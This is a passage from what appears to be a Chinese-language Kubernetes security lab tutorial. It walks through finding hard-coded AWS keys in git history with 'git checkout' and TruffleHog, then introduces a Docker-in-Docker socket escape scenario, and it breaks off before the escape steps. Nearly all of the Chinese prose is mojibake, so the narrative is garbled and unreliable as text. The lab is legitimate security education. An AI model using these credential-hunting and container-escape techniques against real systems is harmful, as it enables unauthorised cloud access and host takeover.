Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:21:48 <span class="token number">2020</span> +0100

    Initial commit with README<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ†æå¤šä¸ªæäº¤åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç‰¹å®šçš„æäº¤æ¯”è¾ƒæœ‰è¶£ï¼Œæ¶‰åŠåˆ°ç¯å¢ƒå˜é‡ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">commit d7c173ad183c574109cd5c4c648ffe551755b576
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:31:06 <span class="token number">2020</span> +0100

    Inlcuded custom environmental variables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>åˆ‡æ¢åˆ°å†å²åˆ†æ”¯</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¹¶åŠ ä¸Šæäº¤ ID æ¥æ£€å‡ºè¯¥ç‰¹å®šæäº¤ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout d7c173ad183c574109cd5c4c648ffe551755b576<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.40.49.png" style="zoom:50%;">

<p>ç°åœ¨æˆ‘ä»¬å¤„äºç‰¹å®šçš„æäº¤å†å²ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç‰¹å®šæäº¤ä¸­æ‰€æœ‰å¯ç”¨çš„æ–‡ä»¶ã€ä»£ç ã€èµ„æºå’Œæ›´æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ Linux å·¥å…·æ¥æ¢ç´¢æ–‡ä»¶ç³»ç»Ÿï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•æ•æ„Ÿçš„æ–‡ä»¶æˆ–æ›´æ”¹ã€‚</p>
<ul>
<li>æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.42.10.png" style="zoom:40%;">

<p>å¯ä»¥çœ‹åˆ°å®ƒåŒ…å«äº†ç¡¬ç¼–ç çš„AWSå¯†é’¥ä»¥åŠflagã€‚</p>
<h3 id="3-1-4-æ–¹æ³•äºŒï¼ˆå‡è®¾è·åˆ°pod-å®¹å™¨è®¿é—®æƒé™ï¼‰"><a href="#3-1-4-æ–¹æ³•äºŒï¼ˆå‡è®¾è·åˆ°pod-å®¹å™¨è®¿é—®æƒé™ï¼‰" class="headerlink" title="3.1.4 æ–¹æ³•äºŒï¼ˆå‡è®¾è·åˆ°pod/å®¹å™¨è®¿é—®æƒé™ï¼‰"></a>3.1.4 æ–¹æ³•äºŒï¼ˆå‡è®¾è·åˆ°pod/å®¹å™¨è®¿é—®æƒé™ï¼‰</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½é€šè¿‡å®¡è®¡æµç¨‹åˆæ³•è·å¾—Pod/å®¹å™¨è®¿é—®æƒé™ï¼Œæˆ–æ˜¯åˆ©ç”¨æŸäº›æ¼æ´è·å–è®¿é—®æƒï¼Œæ­¤æ—¶å¯ä»¥é‡‡ç”¨æ›¿ä»£æ–¹æ¡ˆæ¥è§£å†³æˆ–å®ç°ç›®æ ‡ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨TruffleHogç­‰å¼€æºå·¥å…·åœ¨Gitæäº¤/å†å²è®°å½•ä¸­æŸ¥æ‰¾æ³„éœ²çš„å‡­è¯ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨åˆ†æã€‚</p>
<blockquote>
<h4 id="TruffleHog"><a href="#TruffleHog" class="headerlink" title="TruffleHog"></a>TruffleHog</h4><p><a target="_blank" rel="noopener" href="https://github.com/trufflesecurity/trufflehog">https://github.com/trufflesecurity/trufflehog</a></p>
<p>TruffleHog æ˜¯æœ€å¼ºå¤§çš„å¯†é’¥å‘ç°ã€åˆ†ç±»ã€éªŒè¯å’Œåˆ†æå·¥å…·ã€‚åœ¨æ­¤è¯­å¢ƒä¸­ï¼Œå¯†é’¥æŒ‡çš„æ˜¯æœºå™¨ç”¨äºå‘å¦ä¸€å°æœºå™¨è¿›è¡Œèº«ä»½éªŒè¯çš„å‡­è¯ã€‚è¿™åŒ…æ‹¬ API å¯†é’¥ã€æ•°æ®åº“å¯†ç ã€ç§é’¥åŠ å¯†å¯†é’¥ç­‰ç­‰â€¦â€¦</p>
<ul>
<li>macå®‰è£…ï¼š</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> trufflehog <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2017.02.41.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span>~<span class="token operator">&gt;</span> <span class="token function">which</span> trufflehog
/usr/local/bin/trufflehog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</blockquote>
<ul>
<li>æ¨¡æ‹Ÿè¿›å…¥pod</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.58.42.png" style="zoom:50%;">

<ul>
<li>é€šè¿‡TruffleHogè‡ªåŠ¨åˆ†ææ•æ„Ÿæ•°æ®</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.59.59.png" style="zoom:50%;">

<p>åŒæ ·å¯ä»¥çœ‹åˆ°å®ƒåŒ…å«äº†ç¡¬ç¼–ç çš„AWSå¯†é’¥ä»¥åŠflagã€‚</p>
<p>è·å–åˆ°AWSçš„è®¿é—®å¯†é’¥ï¼ˆ<code>aws_access_key_id</code> å’Œ <code>aws_secret_access_key</code>ï¼‰åï¼Œé»‘å®¢å¯ä»¥ä»¥è¯¥å¯†é’¥æ‰€å±çš„IAMç”¨æˆ·æˆ–è§’è‰²çš„æƒé™æ‰§è¡Œä»»æ„æ“ä½œã€‚</p>
<h2 id="3-2-DIND-docker-in-docker-exploitation"><a href="#3-2-DIND-docker-in-docker-exploitation" class="headerlink" title="3.2 DIND (docker-in-docker) exploitation"></a>3.2 DIND (docker-in-docker) exploitation</h2><p>å¦‚ä½•åœ¨å®¹å™¨ä¸­åˆ©ç”¨Docker IN Dockerå¥—æ¥å­—é€ƒé€¸è®¿é—®å®¿ä¸»æœºã€‚</p>
<blockquote>
<h4 id="DIND-docker-in-docker"><a href="#DIND-docker-in-docker" class="headerlink" title="DIND (docker-in-docker)"></a>DIND (docker-in-docker)</h4><p>DINDï¼ˆDocker-in-Dockerï¼‰æ˜¯ä¸€ç§åœ¨ Docker å®¹å™¨å†…è¿è¡Œå¦ä¸€ä¸ª Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆDocker Daemonï¼‰çš„æŠ€æœ¯ã€‚è¿™ç§æ¨¡å¼é€šå¸¸ç”¨äºéœ€è¦<strong>åœ¨å®¹å™¨å†…éƒ¨ç®¡ç†å…¶ä»–å®¹å™¨</strong>çš„åœºæ™¯ï¼ˆä¾‹å¦‚ CI/CD æµæ°´çº¿ä¸­çš„å®¹å™¨åŒ–æ„å»ºç¯å¢ƒï¼‰ï¼Œä½†å®ƒä¹Ÿå¸¦æ¥äº†ä¸€äº›å¤æ‚æ€§å’Œæ½œåœ¨é—®é¢˜ã€‚</p>
<ul>
<li><strong>DIND çš„æ ¸å¿ƒåŸç†</strong></li>
</ul>
<ol>
<li><strong>å¸¸è§„ Docker æ¶æ„</strong>ï¼š<ul>
<li>å®¿ä¸»æœºï¼ˆHostï¼‰ä¸Šè¿è¡Œä¸€ä¸ª Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆ<code>dockerd</code>ï¼‰ã€‚</li>
<li>æ‰€æœ‰å®¹å™¨å…±äº«å®¿ä¸»æœºçš„ Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆé€šè¿‡ <code>/var/run/docker.sock</code> é€šä¿¡ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>DIND æ¶æ„</strong>ï¼š<ul>
<li>åœ¨ä¸€ä¸ª Docker å®¹å™¨å†…éƒ¨è¿è¡Œ<strong>ç‹¬ç«‹çš„ Docker å®ˆæŠ¤è¿›ç¨‹</strong>ã€‚</li>
<li>è¯¥å®¹å™¨å†…çš„ Docker å®ˆæŠ¤è¿›ç¨‹ä¸å®¿ä¸»æœº Docker å®ˆæŠ¤è¿›ç¨‹å®Œå…¨éš”ç¦»ã€‚</li>
<li>å®¹å™¨å†…éƒ¨çš„ Docker å®¢æˆ·ç«¯ï¼ˆ<code>docker</code> CLIï¼‰ä¼šä¸å®¹å™¨å†…çš„ Docker å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ã€‚</li>
</ul>
</li>
</ol>
<ul>
<li><strong>DIND çš„å¸¸è§ç”¨é€”</strong></li>
</ul>
<ol>
<li><strong>CI/CD æµæ°´çº¿</strong>ï¼š<ul>
<li>åœ¨å®¹å™¨åŒ–çš„æ„å»ºç¯å¢ƒä¸­ï¼ˆå¦‚ GitLab Runnerã€Jenkins Agentï¼‰ï¼Œéœ€è¦åŠ¨æ€åˆ›å»ºå’Œç®¡ç†å…¶ä»–å®¹å™¨ã€‚</li>
<li>ä¾‹å¦‚ï¼šåœ¨ GitLab CI ä¸­æ„å»º Docker é•œåƒå¹¶æ¨é€åˆ°é•œåƒä»“åº“ã€‚</li>
</ul>
</li>
<li><strong>å¤šå®¹å™¨åº”ç”¨æµ‹è¯•</strong>ï¼š<ul>
<li>åœ¨å®¹å™¨å†…éƒ¨å¯åŠ¨ä¸€ç»„åµŒå¥—å®¹å™¨ï¼Œæ¨¡æ‹Ÿå¤æ‚çš„å¤šæœåŠ¡ç¯å¢ƒï¼ˆå¦‚æµ‹è¯• Kubernetes é›†ç¾¤ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å®¹å™¨åŒ–å¼€å‘ç¯å¢ƒ</strong>ï¼š<ul>
<li>å¼€å‘äººå‘˜å¯ä»¥åœ¨å®¹å™¨å†…è¿è¡Œ Dockerï¼Œè€Œæ— éœ€åœ¨å®¿ä¸»æœºä¸Šå®‰è£… Dockerã€‚</li>
</ul>
</li>
</ol>
<ul>
<li>å¦‚ä½•å®ç° DINDï¼Ÿ</li>
</ul>
<p><strong>æ–¹æ³• 1ï¼šä½¿ç”¨ <code>docker:dind</code> å®˜æ–¹é•œåƒ</strong></p>
<p>Docker å®˜æ–¹æä¾›äº† <code>docker:dind</code>ï¼ˆDocker-in-Dockerï¼‰é•œåƒï¼Œå¯åŠ¨å®¹å™¨æ—¶ä¼šè‡ªåŠ¨è¿è¡Œå†…éƒ¨çš„ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</p>
<p><strong>æ–¹æ³• 2ï¼šæŒ‚è½½å®¿ä¸»æœº Docker å¥—æ¥å­—ï¼ˆé DINDï¼‰</strong></p>
<p>è™½ç„¶æŠ€æœ¯ä¸Šä¸å±äº DINDï¼Œä½†å¦ä¸€ç§å¸¸è§æ¨¡å¼æ˜¯ç›´æ¥å°†å®¿ä¸»æœºçš„ Docker å¥—æ¥å­—æŒ‚è½½åˆ°å®¹å™¨å†…ï¼ˆç§°ä¸º <strong>Docker-outside-of-Docker, DooD</strong>ï¼‰ã€‚</p>
<ul>
<li>DIND çš„æ½œåœ¨é—®é¢˜</li>
</ul>
<ol>
<li><strong>æ€§èƒ½å¼€é”€</strong>ï¼š<ul>
<li>åµŒå¥—å®¹å™¨ä¼šå¯¼è‡´å­˜å‚¨é©±åŠ¨ï¼ˆå¦‚ <code>overlay2</code>ï¼‰çš„æ€§èƒ½ä¸‹é™ï¼Œå°¤å…¶æ˜¯æ¶‰åŠå¤šå±‚é•œåƒæ„å»ºæ—¶ã€‚</li>
</ul>
</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼š<ul>
<li>å®¹å™¨å†…çš„ Docker å®ˆæŠ¤è¿›ç¨‹å¯èƒ½æ— æ³•å®Œå…¨éš”ç¦»èµ„æºï¼ˆå¦‚ç½‘ç»œã€å­˜å‚¨å·ï¼‰ï¼Œå¯¼è‡´å†²çªã€‚</li>
</ul>
</li>
<li><strong>å®‰å…¨é—®é¢˜</strong>ï¼š<ul>
<li>è¿è¡Œ Docker-in-Docker é€šå¸¸éœ€è¦å®¹å™¨ä»¥ <code>--privileged</code> æ¨¡å¼è¿è¡Œï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚</li>
<li>å®¹å™¨å†…çš„ Docker å®ˆæŠ¤è¿›ç¨‹å¯èƒ½è¢«ç”¨äºé€ƒé€¸åˆ°å®¿ä¸»æœºã€‚</li>
</ul>
</li>
<li><strong>å­˜å‚¨å·ç®¡ç†</strong>ï¼š<ul>
<li>å®¹å™¨å†…çš„ Docker å®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä½¿ç”¨å®¹å™¨å†…çš„ä¸´æ—¶å­˜å‚¨ï¼Œé‡å¯åæ•°æ®ä¼šä¸¢å¤±ã€‚</li>
</ul>
</li>
</ol>
<p><strong>æ€»ç»“</strong></p>
<p>DIND æ˜¯ä¸€ç§åœ¨å®¹å™¨å†…è¿è¡Œç‹¬ç«‹ Docker å®ˆæŠ¤è¿›ç¨‹çš„æŠ€æœ¯ï¼Œé€‚åˆéœ€è¦ä¸¥æ ¼éš”ç¦»çš„åœºæ™¯ï¼Œä½†ä¼šå¸¦æ¥æ€§èƒ½å’Œå®‰å…¨é£é™©ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåº”æ ¹æ®éœ€æ±‚é€‰æ‹©æœ€ç®€å•å®‰å…¨çš„æ–¹æ¡ˆï¼ˆå¦‚ DooD-Docker-outside-of-Docker æˆ–ä¸“ç”¨å·¥å…·ï¼‰ã€‚</p>
</blockquote>
<h3 id="3-2-1-åœºæ™¯ä»‹ç»"><a href="#3-2-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.2.1 åœºæ™¯ä»‹ç»"></a>3.2.1 åœºæ™¯ä»‹ç»</h3><p>æœ¬åœºæ™¯é‡ç‚¹è§£æé€šè¿‡å®¹å™¨è¿è¡Œæ—¶æ¥å£ï¼ˆå¦‚Docker.sockã€containerd.sockï¼‰æ„å»ºæ ‡å‡†åŒ–ç³»ç»Ÿä¸æµæ°´çº¿çš„å…¸å‹æ¨¡å¼ï¼Œè¿™æ˜¯ä¸€ç±»é€šè¿‡æŒ‚è½½å®¹å™¨Socketç›´æ¥æ“æ§åº•å±‚è¿è¡Œæ—¶ï¼ˆåˆ›å»º/æ„å»º/è¿è¡Œå®¹å™¨ï¼‰çš„æ”»å‡»ï¼Œè‡ªå®¹å™¨æŠ€æœ¯è¯ç”ŸåˆæœŸä¾¿å­˜åœ¨è¢«æ”»å‡»åˆ©ç”¨çš„å®‰å…¨éšæ‚£ï¼Œä¸”ç›¸å…³é…ç½®é”™è¯¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä»æŒç»­é«˜é¢‘å‡ºç°ã€‚</p>
<p>å®è·µç›®æ ‡ï¼š</p>
<ol>
<li>å¦‚ä½•æµ‹è¯•å’Œåˆ©ç”¨å®¹å™¨UNIXå¥—æ¥å­—é…ç½®é”™è¯¯ã€‚</li>
<li>èƒ½å¤Ÿåˆ©ç”¨å®¹å™¨å¹¶ä»Dockerå®¹å™¨ä¸­é€ƒé€¸ã€‚</li>
<li>äº†è§£æµæ°´çº¿å’ŒCI/CDæ„å»ºç³»ç»Ÿä¸­çš„å¸¸è§é…ç½®é”™è¯¯ã€‚</li>
</ol>
<p>å›¾ç¤ºï¼š</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2018.01.32.png" style="zoom:40%;">

<p><strong>å½“å‰ä¸»æµCI/CDæµæ°´çº¿ç³»ç»Ÿæ™®éé‡‡ç”¨DINDï¼ˆDocker-in-Dockerï¼‰æ¨¡å¼ï¼Œé€šè¿‡ç»‘å®šå®¿ä¸»æœºçš„<code>/var/run/docker.sock</code>UNIXå¥—æ¥å­—ï¼Œç›´æ¥è°ƒç”¨åº•å±‚å®¹å™¨è¿è¡Œæ—¶ï¼ˆå¦‚Docker daemonï¼‰æ‰§è¡Œå®¹å™¨æ„å»ºæ“ä½œã€‚æœ¬æ”»å‡»åœºæ™¯å°†æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥å…¸å‹é…ç½®ç¼ºé™·ï¼Œå®ç°ä»å®¹å™¨å†…éƒ¨é€ƒé€¸å¹¶è·å–Kuberneteså·¥ä½œèŠ‚ç‚¹ï¼ˆWorker Nodeï¼‰çš„å®¿ä¸»ç³»ç»Ÿæ§åˆ¶æƒã€‚</strong></p>
<h3 id="3-2-2-åœºæ™¯è®¿é—®"><a href="#3-2-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.2.2 åœºæ™¯è®¿é—®"></a>3.2.2 åœºæ™¯è®¿é—®</h3><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIv